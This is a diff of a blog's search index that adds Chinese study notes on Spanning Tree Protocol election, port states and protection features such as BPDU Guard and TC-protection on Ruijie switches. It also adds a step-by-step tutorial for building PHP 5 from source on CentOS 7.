+<td>Forward Delay</td>
 </tr>
 </tbody></table>
-<h2 id="二层交换机工作原理"><a href="#二层交换机工作原理" class="headerlink" title="二层交换机工作原理"></a>二层交换机工作原理</h2><h3 id="以太网交换机"><a href="#以太网交换机" class="headerlink" title="以太网交换机"></a>以太网交换机</h3><ul>
-<li>早期的以太网使用集线器（HUB）实现终端的互联，但无法分割冲突域，需要使用CSMA&#x2F;CD，传输效率 低下</li>
-<li>现代的以太网大规模普及交换机（Switch），交换机可以分割冲突域</li>
-<li>交换机每个接口都支持全双工或者半双工，以及不同的速率</li>
-<li>园区网络通过以太网交换机将大量终端联入网络</li>
-<li>以太网交换机需要维护一张重要表项——MAC地址表，并通过MAC地址进行数据帧的转发</li>
+<ul>
+<li>Protocol Identifier：2字节，总是为0； </li>
+<li>Version：1字节，0为STP、2为RSTP、3为MSTP；</li>
+<li>Message Type：1字节，0x00为C-BPDU，负责建立和维护STP拓扑，0x80为TCN-BPDU,传达拓扑变更； </li>
+<li>Flags：1字节，最低位&#x3D;TC（Topology Change，拓扑变化）标志，最高位&#x3D;TCA（Topology Change  Acknowledgement，拓扑变化确认）标志；</li>
+<li>Root ID：8字节，指示当前根桥的RID（即“根ID”），由2字节的桥优先级和6字节MAC地址构成；</li>
+<li>Root Path Cost：4字节，指示发送该BPDU报文的端口累计到根桥的开销（1G接口cost值为4，10G接口 cost值为2）；</li>
+<li>Bridge ID：8字节，指示该BPDU报文发送者的BID，是由2字节的桥优先级和6字节MAC地址构成；</li>
+<li>Port ID：2字节，第1个字节为该端口优先级，默认128，第2个字节为发送的端口号。事实上端口优先级的后 4bit和端口号的8bit，共同构成了端口号，由系统分配且不可修改； </li>
+<li>Message Age：2字节，指示该BPDU报文的生存时间，即端口保存BPDU的最长时间；</li>
+<li>Max Age：2字节，指示BPDU消息的最大生存时间，也即老化时间，默认20秒；</li>
+<li>Hello Time：2字节，指示发送两个相邻BPDU的时间间隔，设备通过不断发送BPDU维持自己的地位，Hello  time 是发送的间隔时间，默认2秒； </li>
+<li>Forward Delay：2字节，指示控制listening和learning状态的持续时间，表示在拓扑结构改变后，交换机在 发送数据包前维持在监听和学习状态的时间，默认15秒。</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094723.png" alt="12" loading="lazy"></p>
-<h3 id="二层交换机工作原理-1"><a href="#二层交换机工作原理-1" class="headerlink" title="二层交换机工作原理"></a>二层交换机工作原理</h3><ul>
-<li>二层交换机根据MAC地址，选择性地将帧从接收端口转发到连接目的节点的端口 <ul>
-<li>学习记录：记录源MAC地址和接收端口的对应关系，构建MAC地址表 </li>
-<li>查表转发：交换机收到一个数据帧后，读取该数据帧的目的MAC，并查看MAC地址表 <ul>
-<li>根据查表结果，交换机总共有3种转发行为</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094728.png" alt="13" loading="lazy"></p>
-<h3 id="MAC地址表的建立"><a href="#MAC地址表的建立" class="headerlink" title="MAC地址表的建立"></a>MAC地址表的建立</h3><ul>
-<li>交换机刚启动时，MAC地址表内无表项</li>
-<li>PC1发出数据帧，交换机将PC1帧中的源MAC与接收端口关联起来 </li>
-<li>交换机将PC1的数据帧从其他端口转发出去（接收到帧的端口F0&#x2F;1除外）</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094731.png" alt="14" loading="lazy"></p>
-<h3 id="MAC地址表的建立-1"><a href="#MAC地址表的建立-1" class="headerlink" title="MAC地址表的建立"></a>MAC地址表的建立</h3><ul>
-<li>PC2、PC3回应数据帧</li>
-<li>交换机把收到的帧的源MAC与接收到这个帧的端口关联起来</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094735.png" alt="15" loading="lazy"></p>
-<h3 id="MAC地址表的维护"><a href="#MAC地址表的维护" class="headerlink" title="MAC地址表的维护"></a>MAC地址表的维护</h3><ul>
-<li>MAC地址的维护与老化<ul>
-<li>当交换机的接口DOWN掉后，与该接口相关的MAC地址都会被清除</li>
-<li>当PC一段时间内（MAC地址的老化时间默认5分钟）没有发送任何报文时，交换机会将该PC的MAC地址表项 自动删除</li>
+<h3 id="STP的收敛过程-选举根桥"><a href="#STP的收敛过程-选举根桥" class="headerlink" title="STP的收敛过程-选举根桥"></a>STP的收敛过程-选举根桥</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144742.png" alt="7" loading="lazy"></p>
+<ul>
+<li>在一个交换广播域中，选举一个交换机为根桥，选举过程： <ul>
+<li>比较自己收到BPDU和自己发出的BPDU的Bridge ID，Bridge ID更小的成为根桥：<ul>
+<li>Bridge ID的比较，先比较优先级，优先级更小的成为根桥；</li>
+<li>若优先级一致，则比较交换机的MAC地址（show sysmac显示的地址），MAC地址更小的成为根桥</li>
 </ul>
 </li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094739.png" alt="16" loading="lazy"></p>
-<h3 id="交换机数据帧的单播转发"><a href="#交换机数据帧的单播转发" class="headerlink" title="交换机数据帧的单播转发"></a>交换机数据帧的单播转发</h3><ul>
-<li>PC1向PC2发送单播帧</li>
-<li>交换机根据帧中目的MAC地址，从相应端口F0&#x2F;2发送出去</li>
-<li>交换机不在其他端口转发此单播帧</li>
+</li>
+<li>交换机启动生成树协议，并配置根桥优先级命令：</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094743.png" alt="17" loading="lazy"></p>
-<h3 id="交换机数据帧的泛洪转发"><a href="#交换机数据帧的泛洪转发" class="headerlink" title="交换机数据帧的泛洪转发"></a>交换机数据帧的泛洪转发</h3><ul>
-<li>目标MAC是广播、组播、未知单播帧时，交换机将进行泛洪转发 </li>
-<li>从除接收端口之外的所有其他端口发送出去</li>
+<pre class="language-none"><code class="language-none">Ruijie(config)#spanning-tree mode stp
+Ruijie(config)#spanning-tree
+Ruijie(config)#spanning-tree priority ?
+&lt;0-61440&gt; Bridge priority in increments of 4096 (default value: 32768)</code></pre>
+
+<ul>
+<li>为什么根桥优先级只能是4096的整数倍？ <ul>
+<li>Bridge ID：8字节，指示该BPDU报文发送者的BID，是由2字节的桥优先级和6字节MAC地址构成，而在2字 节（16bit）的优先级字段中，后12bit用来标识VLAN ID，只有前4bit是通过配置修改的。2 12&#x3D;4096。</li>
 </ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220609094746.png" alt="18" loading="lazy"></p>
+</li>
+</ul>
+<h3 id="STP的收敛过程-选举RP"><a href="#STP的收敛过程-选举RP" class="headerlink" title="STP的收敛过程-选举RP"></a>STP的收敛过程-选举RP</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144748.png" alt="8" loading="lazy"></p>
+<ul>
+<li>在广播域内所有的非根桥交换机选择根端口（RP，ROOT Port），RP是非根桥交换机上到根桥距离最近 的端口，每个非根桥有且只有一个RP。非根桥从多个接口接收到BPDU，哪个接口是RP？选举过程：<ul>
+<li>比较接收到的BPDU中的Cost值，最小Cost值的BPDU的接收端口成为RP； </li>
+<li>若Cost值一致，则比较多个BPDU中的Bridge ID，最小Bridge ID值的BPDU的接收端口成为RP。Bridge ID 的比较，先比较优先级，再比较MAC，越小越优先；</li>
+<li>若Bridge ID一致，则比较多个BPDU中的Port ID，最小Port ID值的BPDU的接收端口成为RP。Port ID的比 较，先比较端口优先级，后比较端口号，越小越优先。</li>
+</ul>
+</li>
+<li>修改端口cost值和端口优先级的命令（为什么端口优先级只能是16的整数倍？）：</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config-if-GigabitEthernet 0&#x2F;36)#spanning-tree cost ?
+&lt;1-200000000&gt; Port path cost
+Ruijie(config-if-GigabitEthernet 0&#x2F;36)#spanning-tree port-priority ?
+&lt;0-240&gt; Port priority in increments of 16 (default value: 128)</code></pre>
+
+<h3 id="STP的收敛过程-选举DP"><a href="#STP的收敛过程-选举DP" class="headerlink" title="STP的收敛过程-选举DP"></a>STP的收敛过程-选举DP</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144754.png" alt="9" loading="lazy"></p>
+<ul>
+<li>在所有的链路上选举指定端口（DP，Design Port），通过比较同一段链路上两个端口发送的BPDU中的 字段来实现，选举过程： <ul>
+<li>比较同一段链路上两个端口发送的BPDU中的Cost值，Cost值较小的BPDU的发送端口成为DP；</li>
+<li>若Cost值一致，则比较同一段链路上两个端口发送的BPDU中的的Bridge ID，Bridge ID值较小的BPDU发送 端口成为DP； </li>
+<li>若Bridge ID一致，则比较同一段链路上两个端口发送的BPDU中的Port ID，Port ID值较小的BPDU发送端口 成为DP。</li>
+</ul>
+</li>
+</ul>
+<h3 id="STP的收敛过程-剩余端口Block"><a href="#STP的收敛过程-剩余端口Block" class="headerlink" title="STP的收敛过程-剩余端口Block"></a>STP的收敛过程-剩余端口Block</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144758.png" alt="10" loading="lazy"></p>
+<ul>
+<li>RP和DP之外的端口全部Block</li>
+</ul>
+<h3 id="STP实际案例"><a href="#STP实际案例" class="headerlink" title="STP实际案例"></a>STP实际案例</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144803.png" alt="11" loading="lazy"></p>
+<ul>
+<li>拓扑图说明： <ul>
+<li>6台交换机的MAC地址分别为1111.1111.1111-6666.6666.6666  SW1，桥优先级4096，所有接口优先级和Cost值均为默认值 </li>
+<li>SW2，桥优先级8192，所有接口优先级和Cost值均为默认值 </li>
+<li>SW3，桥优先级默认值，所有接口优先级和Cost为默认值 </li>
+<li>SW4，桥优先级默认值，所有接口优先级和Cost为默认值 </li>
+<li>SW5，桥优先级默认值，0&#x2F;2口优先级为16，其余默认</li>
+<li>SW6，桥优先级默认值，所有接口优先级和Cost为默认值</li>
+</ul>
+</li>
+<li>请根据以上信息，分析该拓扑图中的根桥、所有根端口、 指定端口和Block端口。 </li>
+<li>请根据结果，分析该网络中还存在什么问题？</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144809.png" alt="12" loading="lazy"></p>
+<h3 id="STP的端口状态"><a href="#STP的端口状态" class="headerlink" title="STP的端口状态"></a>STP的端口状态</h3><ul>
+<li>STP生成树收敛完成的过程中，接口会出现的五种状态，分别是：Disable、Blocking、Listening、 Learning和Forwarding： <ul>
+<li>Disable状态：此时交换机端口没有激活，丢弃所有收到的帧，不学习mac地址，不接收BPDU报文； </li>
+<li>Blocking状态：监听BPDU，但是不转发BPDU，丢弃所有收到的数据帧，不学习mac地址也不产生任何 MAC地址表项； </li>
+<li>Listening状态：持续15s，接受并发送BPDU，不转发用户数据，不产生该端口的MAC地址表项，在该状态 下完成STP的收敛，此状态下交换机能决定根桥，并可以选择根端口、指定端口和非指定端口；</li>
+<li>Learning状态：持续15s，接受并发送BPDU，不转发用户数据，完成部分端口的MAC地址表项，目的是为 了减少当用户开始转发数据时，带来的大规模广播包泛洪； </li>
+<li>Forwarding状态：接受并发送BPDU，转发用户数据。</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口状态</th>
+<th>端口能力</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Disabled</td>
+<td>不收发任何报文</td>
+</tr>
+<tr>
+<td>Blocking</td>
+<td>不接收或转发数据  ，接收但不发送BPDU，不进行地址学习</td>
+</tr>
+<tr>
+<td>Listening</td>
+<td>不接收或转发数据，接收并发送BPDU，不进行地址学习</td>
+</tr>
+<tr>
+<td>Learning</td>
+<td>不接收或转发数据，接收并发送BPDU，开始地址学习</td>
+</tr>
+<tr>
+<td>Forwarding</td>
+<td>接收并转发数据，接收并发送BPDU，进行地址学习</td>
+</tr>
+</tbody></table>
+<h3 id="TCN-BPDU详解"><a href="#TCN-BPDU详解" class="headerlink" title="TCN-BPDU详解"></a>TCN-BPDU详解</h3><ul>
+<li>IEEE 802.1D协议规定，TCN-BPDU（下文简称TC报文）的产生条件有两个： <ul>
+<li>网桥上有端口转变为Forwarding状态，且该网桥至少包含一个指定端口； </li>
+<li>网桥上有端口从Forwarding状态或Learning状态转变为Blocking状态；</li>
+</ul>
+</li>
+<li>若上述两个条件之一满足，就说明网络拓扑发生了变化，网桥就需要使用TC报文将拓扑发生变化的情况通 知根桥。</li>
+<li>在日常维护中，TC报文的产生通常有以下几种情况： <ul>
+<li>设备或链路出现故障，引发STP重新计算，产生TC报文； </li>
+<li>STP配置参数更改，引发STP重新计算，产生TC报文； 连接终端的端口使能了STP，但没有配置为边缘端口，当终端发生重启等情况导致该端口链路状态变化时，该 端口产生TC报文；</li>
+<li>来自用户设备的攻击TC报文也可能传入其所接入的二层网络。</li>
+</ul>
+</li>
+</ul>
+<h3 id="TCN-BPDU交互实例"><a href="#TCN-BPDU交互实例" class="headerlink" title="TCN-BPDU交互实例"></a>TCN-BPDU交互实例</h3><ul>
+<li>网桥感知到拓扑变化，产生TCN-BPDU，从根端口发出，通知根桥 ；</li>
+<li>如果上游网桥不是根桥，则上游网桥会将下一个要发送的配置BPDU 中的TCA位置为1，作为对TCN的确认，发送给下游网桥； </li>
+<li>上游网桥从根端口发送TCN-BPDU，通知根桥；</li>
+<li>重复第2、3步，直到根桥收到TCN-BPDU；</li>
+<li>根桥收到TCN-BPDU后，会将下一个要发送的配置BPDU的TCA位置 为1作为对TCN的确认。同时根桥会将自己的MAC地址表老化时间由 300秒修改为Forward Delay即15秒，同时根桥还会发出TCN位置为 1的配置BPDU，用来通知网络中所有网桥网络拓扑发生了变化。</li>
+<li>根桥在之后的Max Age+Forward Delay时间内，将发送TCN置为1 的配置BPDU，当网桥收到该配置BPDU后，会将自己MAC地址老化 时间由300s缩短为Forward Delay即15秒。</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144815.png" alt="13" loading="lazy"></p>
+<h3 id="STP重新收敛过程分析"><a href="#STP重新收敛过程分析" class="headerlink" title="STP重新收敛过程分析"></a>STP重新收敛过程分析</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144821.png" alt="14" loading="lazy"></p>
+<h2 id="STP技术高级特性"><a href="#STP技术高级特性" class="headerlink" title="STP技术高级特性"></a>STP技术高级特性</h2><h3 id="STP高级特性-Port-Fasts"><a href="#STP高级特性-Port-Fasts" class="headerlink" title="STP高级特性-Port Fasts"></a>STP高级特性-Port Fasts</h3><ul>
+<li>交换机的某端口如果接入了用户终端，那么常规配置下，该端口需要经过2个Forwarding Delay才能够进 入转发状态（Listening和Learning，共计30秒），很明显这是不合理的； </li>
+<li>可以将接入用户终端的接口配置为Port Fast，这样该接口可以跳过30秒的等待时间，直接进入转发状态； </li>
+<li>如果设置了Port Fast的端口还收到了BPDU，则该端口会经过2个Forwarding Delay后进入转发状态；</li>
+<li>下图表示了一个设备的哪些端口可以配置为 Port Fast： </li>
+<li>配置命令：</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#interface gigabitEthernet 0&#x2F;1
+Ruijie(config-if-GigabitEthernet 0&#x2F;1)#spanning-tree 
+portfast</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144824.png" alt="15" loading="lazy"></p>
+<h3 id="STP高级特性-BPDU-Guard"><a href="#STP高级特性-BPDU-Guard" class="headerlink" title="STP高级特性-BPDU Guard"></a>STP高级特性-BPDU Guard</h3><ul>
+<li><p>BPDU Guard的意义就是一个不该接收BPDU的端口（比如portfast端口）一旦收到BPDU报文，那么该功 能将会立即关闭该端口，并将端口状态置为error-disabled状态，该模式下，接口可以发出BPDU； </p>
+</li>
+<li><p>BPDU Guard的两种配置模式 </p>
+<ul>
+<li>全局模式启用：全局模式启用该功能之后，会在所有配置了portfast的接口生效。如果某个接口打开了 Port  Fast，而该接口收到了 BPDU，那么该端口就会进入 Error-disabled 状态，表示网络中可能被非法用户增加 了一台网络设备，使网络拓朴发生改变。配置命令：</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#spanning-tree portfast bpduguard default</code></pre>
+
+
+
+<ul>
+<li>接口模式启用：打开单个接口的 BPDU Guard(与该端口是否配置 portfast 无关)。在这个情况下如果该端口 收到了 BPDU，就会进入 Error-disabled 状态</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#interface gigabitEthernet 0&#x2F;1
+Ruijie(config-if-GigabitEthernet 0&#x2F;1)#spanning-tree bpduguard enable</code></pre>
+</li>
+<li><p>Error-disabled如何恢复 </p>
+<ul>
+<li>接口模式下，shutdown然后no shutdown </li>
+<li>全局模式下，errdisable recovery interval 300s</li>
+</ul>
+</li>
+</ul>
+<h3 id="STP高级特性-BPDU-Filter"><a href="#STP高级特性-BPDU-Filter" class="headerlink" title="STP高级特性-BPDU Filter"></a>STP高级特性-BPDU Filter</h3><ul>
+<li>BPDU Filter可以过滤掉接口上收到或发出的BPDU； </li>
+<li>BPDU Guard的两种配置模式<ul>
+<li>全局模式启用：打开全局的 BPDU Filter功能，在这种状态下，开启Port Fast的接口将既不收 BPDU，也不 发出BPDU，连到portfast端口的主机就收不到BPDU。而如果开启portfast的端口收到了BPDU，那么该端口 的portfast属性将失效，同时BPDU Filter也自动失效，配置命令：</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#spanning-tree portfast bpdufilter default</code></pre>
+
+<ul>
+<li>接口模式启用：在接口模式下，开启单个接口的BPDU Filter(与该端口 是否打开 Port Fast 无关)。在这个情 况下该接口既不收 BPDU，也不发 BPDU，相当于关闭了该接口的STP功能，接口直接进入转发状态。</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#interface gigabitEthernet 0&#x2F;1
+Ruijie(config-if-GigabitEthernet 0&#x2F;1)#spanning-tree bpdufilter enable</code></pre>
+
+<h3 id="STP高级特性-Tc-protection"><a href="#STP高级特性-Tc-protection" class="headerlink" title="STP高级特性-Tc-protection"></a>STP高级特性-Tc-protection</h3><ul>
+<li>TC-BPDU 报文是指携带 TC 标志的 BPDU 报文，交换机收到这类报文表示网络拓扑发生了变化，会进行 MAC 地址表的删除操作。对三层交换机，还会引发快转模块的重新打通操作，并改变 ARP 表项的端口状 态。 </li>
+<li>为避免交换机受到伪造 TC-BPDU 报文的恶意攻击时频繁进行以上操作，设备CPU负荷过重，影响网络稳 定，可以使用 TC-protection 功能进行保护：<ul>
+<li>在打开相应功能时，收到TC-BPDU 报文后的一定时间内(一般为 4 秒)，只进行一次删除操作，同时监控该时 间段内是否收到 TC-BPDU报文。 </li>
+<li>如果在该时间段内收到了TC-BPDU报文，则设备在该时间超时后再进行一次删除操作。这样可以避免频繁的 删除 MAC 地址表项和 ARP表项，保护设备CPU资源。</li>
+</ul>
+</li>
+<li>配置命令：</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#spanning-tree tc-protection</code></pre>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -4735,6 +5898,111 @@ pip3 install dailycheckin --upgrade -t .</code></pre>
       </categories>
       <tags>
         <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7安装PHP5</title>
+    <url>/posts/b394315b/</url>
+    <content><![CDATA[<p>参考：<a href="https://www.cnblogs.com/xxdebug/p/14142266.html">centos7安装PHP5 - xiaoxiaoの - 博客园 </a></p>
+<ol>
+<li>创建文件夹</li>
+</ol>
+<pre class="language-none"><code class="language-none">mkdir &#x2F;usr&#x2F;local&#x2F;src&#x2F;php 
+
+cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813652.png" alt="1" loading="lazy"></p>
+<ol start="2">
+<li>安装依赖</li>
+</ol>
+<pre class="language-none"><code class="language-none">yum install -y gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libpng libpng-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses curl openssl-devel gdbm-devel db4-devel libXpm-devel libX11-devel gd-devel gmp-devel readline-devel libxslt-devel expat-devel xmlrpc-c xmlrpc-c-devel</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813996.png" alt="2" loading="lazy"></p>
+<ol start="3">
+<li>解压下载的php源码包</li>
+</ol>
+<pre class="language-none"><code class="language-none">tar -xzvf +你的包名.tar.gz</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814770.png" alt="3" loading="lazy"></p>
+<ol start="4">
+<li><p>将解压的文件复制到&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;下</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814486.png" alt="4" loading="lazy"></p>
+</li>
+<li><p>进入&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25这个文件夹后在终端输入如下命令</p>
+</li>
+</ol>
+<pre class="language-none"><code class="language-none">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814634.png" alt="5" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php --with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc --enable-fpm --enable-sysvsem --enable-sockets --enable-pcntl --enable-mbstring --enable-mysqlnd --enable-opcache --enable-shmop --enable-zip --enable-ftp --enable-gd-native-ttf --enable-wddx --enable-soap</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814784.png" alt="6" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">make</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814067.png" alt="7" loading="lazy"></p>
+<ol start="6">
+<li>安装</li>
+</ol>
+<pre class="language-none"><code class="language-none">make install
+
+cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default php-fpm.conf
+
+cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development
+
+cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini
+
+cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;sapi&#x2F;fpm&#x2F;init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814525.png" alt="8" loading="lazy"></p>
+<ol start="7">
+<li>添加权限</li>
+</ol>
+<pre class="language-none"><code class="language-none">chmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
+
+<ol start="8">
+<li>添加开机启动</li>
+</ol>
+<pre class="language-none"><code class="language-none">chkconfig --add php-fpm</code></pre>
+
+<ol start="9">
+<li>设置启动等级</li>
+</ol>
+<pre class="language-none"><code class="language-none">chkconfig --level 35 php-fpm on
+
+cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf
+
+vim &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf 
+
+找到 ;pid &#x3D; run&#x2F;php-fpm.pid 去掉前面的分号</code></pre>
+
+<ol start="10">
+<li>启动</li>
+</ol>
+<pre class="language-none"><code class="language-none">service php-fpm start</code></pre>
+
+<ol start="11">
+<li>设置环境变量</li>
+</ol>
+<pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;profile 
+
+底部添加
+PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source &#x2F;etc&#x2F;profile</code></pre>
+
+<ol start="12">
+<li>查看安装版本</li>
+</ol>
+<pre class="language-none"><code class="language-none">php -v</code></pre>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>CentOS7</tag>
       </tags>
   </entry>
 </search>
